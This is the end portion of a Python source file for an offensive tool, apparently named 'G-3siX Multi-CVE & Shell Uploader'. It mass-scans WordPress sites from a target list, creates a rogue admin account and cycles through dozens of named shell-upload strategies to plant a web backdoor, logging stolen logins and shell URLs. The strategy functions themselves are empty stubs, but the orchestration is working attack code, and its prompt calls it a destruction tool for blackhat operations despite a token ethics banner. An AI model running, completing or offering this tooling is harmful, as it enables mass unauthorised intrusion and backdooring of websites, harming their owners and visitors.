def strategy_backup_restore_abuse(site, session, cve_secret_token): return None
def strategy_wp_importer_abuse(site, session, cve_secret_token): return None
def strategy_functions_php_backdoor(site, session, cve_secret_token): return None
def strategy_plugin_main_backdoor(site, session, cve_secret_token): return None
def strategy_dropin_inject(site, session, cve_secret_token): return None
def strategy_wp_cron_downloader(site, session, cve_secret_token): return None
def strategy_hidden_admin_create(site, session, cve_secret_token): return None
def strategy_wp_options_inject(site, session, cve_secret_token): return None
def strategy_widget_inject(site, session, cve_secret_token): return None
def strategy_rest_api_upload(site, session, cve_secret_token): return None
def strategy_polyglot_upload(site, session, cve_secret_token): return None
def strategy_user_ini_inject(site, session, cve_secret_token): return None
def strategy_writable_dir_scan(site, session, cve_secret_token): return None
def strategy_log_poisoning_lfi(site, session, cve_secret_token): return None
def strategy_error_log_trigger(site, session, cve_secret_token): return None
def strategy_double_ext_upload(site, session, cve_secret_token): return None
def strategy_mime_type_bypass(site, session, cve_secret_token): return None
def strategy_htaccess_override(site, session, cve_secret_token): return None
def strategy_nullbyte_semicolon_space(site, session, cve_secret_token): return None
def strategy_media_library_direct(site, session, cve_secret_token): return None
def strategy_elfinder_connector(site, session, cve_secret_token): return None
def strategy_custom_upload_endpoints(site, session, cve_secret_token): return None
def strategy_webdav_put(site, session, cve_secret_token): return None
def strategy_wp_includes_inject(site, session, cve_secret_token): return None
def strategy_template_override(site, session, cve_secret_token): return None
def strategy_language_file_inject(site, session, cve_secret_token): return None
def strategy_shortcode_rce(site, session, cve_secret_token): return None
def strategy_contact_form_upload(site, session, cve_secret_token): return None
def strategy_revslider_upload(site, session, cve_secret_token): return None
def strategy_woocommerce_upload(site, session, cve_secret_token): return None
def strategy_bbpress_buddypress_upload(site, session, cve_secret_token): return None
def strategy_learndash_upload(site, session, cve_secret_token): return None
def strategy_auto_prepend_append(site, session, cve_secret_token): return None
def strategy_scheduled_task_download(site, session, cve_secret_token): return None
def strategy_session_poisoning(site, session, cve_secret_token): return None
def strategy_cache_file_inject(site, session, cve_secret_token): return None
def strategy_upload_progress_abuse(site, session, cve_secret_token): return None
def strategy_phpinfo_tmpfile(site, session, cve_secret_token): return None
def strategy_ftp_upload(site, session, cve_secret_token): return None
def strategy_ssh_sftp_upload(site, session, cve_secret_token): return None
def strategy_cpanel_filemanager(site, session, cve_secret_token): return None
def strategy_rfi_include(site, session, cve_secret_token): return None
def strategy_symlink_attack(site, session, cve_secret_token): return None
def strategy_path_traversal_upload(site, session, cve_secret_token): return None
def strategy_race_condition_upload(site, session, cve_secret_token): return None
def strategy_chunked_upload(site, session, cve_secret_token): return None
def strategy_multisite_abuse(site, session, cve_secret_token): return None
def strategy_database_shellwrite(site, session, cve_secret_token): return None
def strategy_cron_remote_download(site, session, cve_secret_token): return None
def strategy_object_injection(site, session, cve_secret_token): return None
def strategy_export_import_shell(site, session, cve_secret_token): return None
def strategy_rest_api_custom_endpoint(site, session, cve_secret_token): return None
def strategy_malware_downloader(site, session, cve_secret_token): return None
def strategy_cronjob_persistence(site, session, cve_secret_token): return None
def strategy_ajax_upload(site, session, cve_secret_token): return None
def strategy_file_manager_scan(site, session, cve_secret_token): return None

def shell_upload_target_worker(target_info: Dict, log_queue: Queue) -> None:
    """Login and attempt shell upload for a single target."""
    site = target_info["site"]
    user = target_info["user"]
    pwd = target_info["password"]
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    cve_secret_token = target_info["secret"]

    log_queue.put(("shell_info", site, f"Attempting shell upload as {user}:{pwd}..."))

    session = wp_admin_login_for_shell(site, user, pwd)
    if not session:
        log_queue.put(("shell_fail", site, "LOGIN_FAIL_FOR_SHELL"))
        save_to_file(SHELL_RESULT_FILE, f"[LOGIN_FAIL] {ts} | {site} | {user}:{pwd} | FAILED_LOGIN_FOR_SHELL")
        time.sleep(random.uniform(INTER_TARGET_DELAY_MIN, INTER_TARGET_DELAY_MAX)) # Delay even if shell fails
        return

    log_queue.put(("shell_info", site, f"Admin login successful as {user}."))

    strategies = [
        ("rce_direct_file_write", strategy_rce_direct_file_write),
        ("wp_config_backdoor_injection", strategy_wp_config_backdoor_injection),
        ("mu_plugin_drop", strategy_mu_plugin_drop),
        ("media_library_bypass", strategy_media_library_bypass),
        ("plugin_upload", strategy_plugin_upload),
        ("theme_editor", strategy_theme_editor),
        ("plugin_editor", strategy_plugin_editor),
        ("xmlrpc_upload_ssrf", strategy_xmlrpc_upload_ssrf),
        ("rest_api_upload", strategy_rest_api_upload),
        ("theme_zip_install", strategy_theme_zip_install),
        ("gallery_form_upload", strategy_gallery_form_upload),
        ("backup_restore_abuse", strategy_backup_restore_abuse),
        ("wp_importer_abuse", strategy_wp_importer_abuse),
        ("functions_php_backdoor", strategy_functions_php_backdoor),
        ("plugin_main_backdoor", strategy_plugin_main_backdoor),
        ("dropin_inject", strategy_dropin_inject),
        ("wp_cron_downloader", strategy_wp_cron_downloader),
        ("hidden_admin_create", strategy_hidden_admin_create),
        ("wp_options_inject", strategy_wp_options_inject),
        ("widget_inject", strategy_widget_inject),
        ("polyglot_upload", strategy_polyglot_upload),
        ("user_ini_inject", strategy_user_ini_inject),
        ("writable_dir_scan", strategy_writable_dir_scan),
        ("log_poisoning_lfi", strategy_log_poisoning_lfi),
        ("error_log_trigger", strategy_error_log_trigger),
        ("double_ext_upload", strategy_double_ext_upload),
        ("mime_type_bypass", strategy_mime_type_bypass),
        ("htaccess_override", strategy_htaccess_override),
        ("nullbyte_semicolon_space", strategy_nullbyte_semicolon_space),
        ("media_library_direct", strategy_media_library_direct),
        ("elfinder_connector", strategy_elfinder_connector),
        ("custom_upload_endpoints", strategy_custom_upload_endpoints),
        ("webdav_put", strategy_webdav_put),
        ("wp_includes_inject", strategy_wp_includes_inject),
        ("template_override", strategy_template_override),
        ("language_file_inject", strategy_language_file_inject),
        ("shortcode_rce", strategy_shortcode_rce),
        ("contact_form_upload", strategy_contact_form_upload),
        ("revslider_upload", strategy_revslider_upload),
        ("woocommerce_upload", strategy_woocommerce_upload),
        ("bbpress_buddypress_upload", strategy_bbpress_buddypress_upload),
        ("learndash_upload", strategy_learndash_upload),
        ("auto_prepend_append", strategy_auto_prepend_append),
        ("scheduled_task_download", strategy_scheduled_task_download),
        ("session_poisoning", strategy_session_poisoning),
        ("cache_file_inject", strategy_cache_file_inject),
        ("upload_progress_abuse", strategy_upload_progress_abuse),
        ("phpinfo_tmpfile", strategy_phpinfo_tmpfile),
        ("ftp_upload", strategy_ftp_upload),
        ("ssh_sftp_upload", strategy_ssh_sftp_upload),
        ("cpanel_filemanager", strategy_cpanel_filemanager),
        ("rfi_include", strategy_rfi_include),
        ("symlink_attack", strategy_symlink_attack),
        ("path_traversal_upload", strategy_path_traversal_upload),
        ("race_condition_upload", strategy_race_condition_upload),
        ("chunked_upload", strategy_chunked_upload),
        ("multisite_abuse", strategy_multisite_abuse),
        ("database_shellwrite", strategy_database_shellwrite),
        ("cron_remote_download", strategy_cron_remote_download),
        ("object_injection", strategy_object_injection),
        ("export_import_shell", strategy_export_import_shell),
        ("rest_api_custom_endpoint", strategy_rest_api_custom_endpoint),
        ("malware_downloader", strategy_malware_downloader),
        ("cronjob_persistence", strategy_cronjob_persistence),
        ("ajax_upload", strategy_ajax_upload),
        ("file_manager_scan", strategy_file_manager_scan),
    ]
    random.shuffle(strategies)

    for strat_name, strat_func in strategies:
        log_queue.put(("shell_info", site, f"  Trying shell strategy: {strat_name}"))
        try:
            shell_url = strat_func(site, session, cve_secret_token)
        except Exception as e:
            console.print(f"    [dim red]  Error in shell strategy {strat_name} for {site}: {type(e).__name__} - {e}[/dim red]")
            shell_url = None

        if shell_url:
            status = verify_shell_3layer(shell_url, session)
            save_to_file(SHELL_RESULT_FILE, f"[SHELL] {ts} | {shell_url} | {user}:{pwd} | {status} | via:{strat_name}")
            log_queue.put(("shell_success", site, f"{status} | {shell_url} | via {strat_name}"))
            time.sleep(random.uniform(INTER_TARGET_DELAY_MIN, INTER_TARGET_DELAY_MAX)) # Delay before next target
            return

    log_queue.put(("shell_fail", site, "NO_SHELL_ALL_STRATS_FAILED"))
    save_to_file(SHELL_RESULT_FILE, f"[NO_SHELL] {ts} | {site} | {user}:{pwd} | ALL_STRATS_FAILED")
    time.sleep(random.uniform(INTER_TARGET_DELAY_MIN, INTER_TARGET_DELAY_MAX)) # Delay even if all shells fail


def shell_upload_batch_processor(log_queue: Queue) -> None:
    """Thread for processing batches of CVE-pwned targets for shell upload."""
    from concurrent.futures import ThreadPoolExecutor

    while True:
        batch_targets = SHELL_UPLOAD_QUEUE.get()
        if batch_targets is None:
            break
        
        log_queue.put(("shell_wave", "orchestrator", f"Launching shell wave for {len(batch_targets)} targets."))
        
        with ThreadPoolExecutor(max_workers=SHELL_UPLOAD_WORKER_THREADS) as pool:
            futures = [pool.submit(shell_upload_target_worker, target, log_queue) for target in batch_targets]
            for future in futures:
                try:
                    future.result(timeout=SHELL_UPLOAD_TIMEOUT)
                except Exception as e:
                    console.print(f"    [dim red]  Shell upload task failed: {e}[/dim red]")
        
        log_queue.put(("shell_wave", "orchestrator", f"Shell wave for {len(batch_targets)} targets finished."))
        SHELL_UPLOAD_QUEUE.task_done()


# ══════════════════════════════════════════════════════════════════════
# LIVE LOG & MAIN ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════

def chunkify(lst: List[str], n: int) -> List[List[str]]:
    if n <= 0:
        n = 1
    return [lst[i::n] for i in range(n)]


def printer_loop(queue: Queue, total_cve_targets: int) -> None:
    """MRG Live Log View for both CVE and Shell Upload."""
    processed_cve = 0
    cve_stats = {"success": 0, "partial": 0, "fail": 0}
    shell_stats = {"success": 0, "fail": 0}

    ICONS = {
        "success": "\033[1;92m[VULN]\033[0m",
        "partial": "\033[1;93m[PART]\033[0m",
        "fail":    "\033[1;91m[FAIL]\033[0m",
        "info":    "\033[1;96m[INFO]\033[0m",
        "wave":    "\033[1;35m[WAVE]\033[0m",
        "shell_info": "\033[1;96m[SINFO]\033[0m",
        "shell_success": "\033[1;92m[SHELL]\033[0m",
        "shell_fail": "\033[1;91m[SFAIL]\033[0m",
    }

    bar = f"\033[1;96m{'━' * 70}\033[0m"
    print(bar, flush=True)
    print(f"\033[1;97m  MRG ULTIMATE LIVE LOG  \033[0m│ "
          f"\033[90mCVE Targets: {total_cve_targets} │ "
          f"CVE Output: {CVE_RESULT_FILE} | Shell Output: {SHELL_RESULT_FILE}\033[0m", flush=True)
    print(bar, flush=True)

    while True:
        item = queue.get()
        if item is None:
            break

        msg_type, site_or_source, detail = item
        
        if msg_type in cve_stats:
            processed_cve += 1
            cve_stats[msg_type] += 1
        elif msg_type == "shell_success":
            shell_stats["success"] += 1
        elif msg_type == "shell_fail":
            shell_stats["fail"] += 1

        icon = ICONS.get(msg_type, "\033[37m[???]\033[0m")
        domain = re.sub(r'^https?://', '', site_or_source) if site_or_source.startswith(('http://', 'https://')) else site_or_source

        if len(detail) > 50:
            detail = detail[:47] + "..."

        ts_short = time.strftime("%H:%M:%S")
        
        if msg_type.startswith("shell_"):
            prefix = "[SHELL] "
            site_display = f"{domain:<35}"
        elif msg_type == "wave":
            prefix = "[ORCH]  "
            site_display = f"{site_or_source:<35}"
        else:
            prefix = "[CVE]   "
            site_display = f"{domain:<35}"

        print(
            f"  \033[90m{ts_short}\033[0m "
            f"{icon} "
            f"{prefix}"
            f"\033[1;97m{site_display}\033[0m "
            f"\033[90m{detail}\033[0m",
            flush=True,
        )

        if total_cve_targets > 0 and (processed_cve % 5 == 0 or processed_cve == total_cve_targets):
            pct = int((processed_cve / total_cve_targets) * 100) if total_cve_targets else 0
            filled = int(pct / 5)
            prog = f"\033[92m{'█' * filled}\033[90m{'░' * (20 - filled)}\033[0m"
            print(
                f"  {prog} \033[97m{pct}%\033[0m "
                f"[\033[92m{cve_stats['success']}V\033[0m "
                f"\033[93m{cve_stats['partial']}P\033[0m "
                f"\033[91m{cve_stats['fail']}F\033[0m] "
                f"\033[90m{processed_cve}/{total_cve_targets} CVEs scanned\033[0m",
                flush=True,
            )

    print(bar, flush=True)
    print(
        f"  \033[1;97mDONE CVE SCAN\033[0m │ "
        f"\033[1;92mVULN:{cve_stats['success']}\033[0m "
        f"\033[1;93mPARTIAL:{cve_stats['partial']}\033[0m "
        f"\033[1;91mFAIL:{cve_stats['fail']}\033[0m │ "
        f"{processed_cve}/{total_cve_targets} CVEs processed",
        flush=True,
    )
    print(
        f"  \033[1;97mDONE SHELL UPLOAD\033[0m │ "
        f"\033[1;92mSHELLS:{shell_stats['success']}\033[0m "
        f"\033[1;91mFAIL:{shell_stats['fail']}\033[0m ",
        flush=True,
    )
    print(bar, flush=True)


def main() -> None:
    global SHELL_CONTENT, ACTIVE_PROXY

    console.clear()
    console.print(render_banner())

    console.print(Panel(
        Text("[!!! ETHICS REMINDER AS PER ORIGINAL CODE !!!] G-3siX Multi-CVE & Shell Uploader adalah alat untuk pengujian penetrasi dan riset keamanan defensif.\n\n"
             "SEMUA tindakan, terutama yang melibatkan upload shell dan privilege escalation, HARUS dilakukan dengan OTORISASI EKPLISIT dari pemilik target.\n"
             "AKSES TANPA IZIN ATAU PENGGUNAAN BERNIAT JAHAT DILARANG KERAS. ANDA SEPENUHNYA BERTANGGUNG JAWAB ATAS TINDAKAN ANDA.\n"
             "Tujuannya adalah untuk mengidentifikasi dan melaporkan kerentanan, atau untuk mengaudit aset Anda SENDIRI. BUKAN untuk mengeksploitasi sistem orang lain.",
             justify="center", style="bold red"),
        border_style="bold red", box=box.DOUBLE, padding=(1, 2)
    ))
    confirm = console.input("[bold yellow]HackerSec.ID: Saya mengerti bahwa untuk operasi BLACKHAT, ini adalah alat PENGHANCURAN. Lanjutkan? (y/n): [/bold yellow]").strip().lower()
    if confirm != 'y':
        sys.exit(0)

    ACTIVE_PROXY = _get_proxy_interactive()
    if ACTIVE_PROXY is None:
        cont_without_proxy = console.input("[bold yellow]Lanjutkan tanpa proxy? (y/n): [/bold yellow]").strip().lower()
        if cont_without_proxy != 'y':
            sys.exit(1)

    try:
        with open(SHELL_LOCAL_PATH, "r", encoding="utf-8") as f:
            SHELL_CONTENT = f.read()
        if not SHELL_CONTENT or "OxyShellMedan" not in SHELL_CONTENT:
            console.print(f"[bold red]Shell invalid:[/bold red] {SHELL_LOCAL_PATH}. Pastikan ini OxyBackdoor Pro v5.0.")
            console.print("[bold yellow]Shell Upload Phase DISABLED[/bold yellow]")
            SHELL_CONTENT = ""
        else:
            console.print(f"[bold green]Shell loaded:[/bold green] {SHELL_LOCAL_PATH} ({len(SHELL_CONTENT)} bytes)")
    except FileNotFoundError:
        console.print(f"[bold red]Shell not found:[/bold red] {SHELL_LOCAL_PATH}. Pastikan file ini ada.")
        console.print("[bold yellow]Shell Upload Phase DISABLED[/bold yellow]")
        SHELL_CONTENT = ""

    targets_file = console.input("[bold cyan]Targets file (one host/URL per line)[/bold cyan] [list.txt]: ").strip() or "list.txt"
    cve_threads_count_input = console.input("[bold cyan]CVE Scanner Threads (1-500)[/bold cyan] [300]: ").strip() or "300"
    try: cve_threads_count = min(max(int(cve_threads_count_input), 1), 500)
    except ValueError: cve_threads_count = 300
    
    admin_username = console.input(f"[bold cyan]New Admin Username[/bold cyan] [666MrG66]: ").strip() or "666MrG66"
    admin_email = console.input(f"[bold cyan]New Admin Email[/bold cyan] [satuhari006@gmail.com]: ").strip() or "satuhari006@gmail.com"
    admin_password = console.input(f"[bold cyan]New Admin Password[/bold cyan] [Raja_minyak614]: ").strip() or "Raja_minyak614"

    try:
        with open(targets_file, "r", encoding="utf-8") as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[bold red]File not found: {targets_file}[/bold red]")
        sys.exit(1)

    if not targets:
        console.print("[bold red]Target list kosong.[/bold red]")
        sys.exit(1)

    console.print(
        f"\n[bold white]Targets:[/bold white] {len(targets)} | "
        f"[bold white]CVE Threads:[/bold white] {cve_threads_count} | "
        f"[bold white]Shell Upload Threads:[/bold white] {SHELL_UPLOAD_WORKER_THREADS} | "
        f"[bold white]New Admin:[/bold white] {admin_username}:{admin_password}\n"
    )

    n_cve_threads = min(cve_threads_count, len(targets))
    cve_chunks = chunkify(targets, n_cve_threads)

    log_queue: Queue = Queue()
    printer = threading.Thread(
        target=printer_loop, args=(log_queue, len(targets)), daemon=True
    )
    printer.start()

    shell_processor_thread = threading.Thread(
        target=shell_upload_batch_processor, args=(log_queue,), daemon=True,
        name="ShellBatchProcessor"
    )
    if SHELL_CONTENT:
        shell_processor_thread.start()
    else:
        console.print("[bold yellow]Shell upload processor not started (shell content disabled).[/bold yellow]")

    cve_workers: List[threading.Thread] = []
    for i, chunk in enumerate(cve_chunks):
        t = threading.Thread(
            target=cve_worker_thread,
            args=(chunk, log_queue, admin_username, admin_email, admin_password),
            daemon=True,
            name=f"cve-worker-{i}"
        )
        t.start()
        cve_workers.append(t)

    for t in cve_workers:
        t.join()

    with LOG_LOCK:
        if VULN_COUNTER_FOR_SHELL_UPLOAD > 0:
            log_queue.put(("wave", "orchestrator", f"Triggering final shell wave for {VULN_COUNTER_FOR_SHELL_UPLOAD} targets..."))
            SHELL_UPLOAD_QUEUE.put(list(VULN_TARGETS_FOR_SHELL_UPLOAD))
            VULN_TARGETS_FOR_SHELL_UPLOAD.clear()
            VULN_COUNTER_FOR_SHELL_UPLOAD = 0

    if SHELL_CONTENT:
        SHELL_UPLOAD_QUEUE.put(None)
        shell_processor_thread.join()

    log_queue.put(None)
    printer.join()

    console.print(
        f"\n[bold green]Ultimate Pipeline Done by HackerSec.ID.[/bold green] "
        f"CVE Results: [bold]{CVE_RESULT_FILE}[/bold] | "
        f"CVE Failed: [bold]{CVE_FAIL_FILE}[/bold] | "
        f"Shells: [bold]{SHELL_RESULT_FILE}[/bold]"
    )


if __name__ == "__main__":
    main()
